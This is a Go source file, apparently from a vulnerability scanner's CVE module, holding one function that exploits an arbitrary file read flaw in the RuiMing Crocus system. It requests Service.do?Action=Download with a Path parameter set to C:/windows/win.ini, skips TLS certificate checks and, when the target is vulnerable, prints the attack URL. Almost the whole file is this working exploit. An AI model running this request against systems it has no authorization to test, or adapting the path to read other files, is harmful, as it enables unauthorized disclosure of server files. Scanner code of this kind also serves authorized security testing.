package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func RuiMingCrocus_ArbitraryFileReading(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/Service.do?Action=Download&Path=C:/windows/win.ini", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if response.StatusCode == 200 && strings.Contains(string(body), "for 16-bit") {
		fmt.Println("[*]锐明Crocus系统任意文件读取 : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/Service.do?Action=Download&Path=C:/windows/win.ini\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
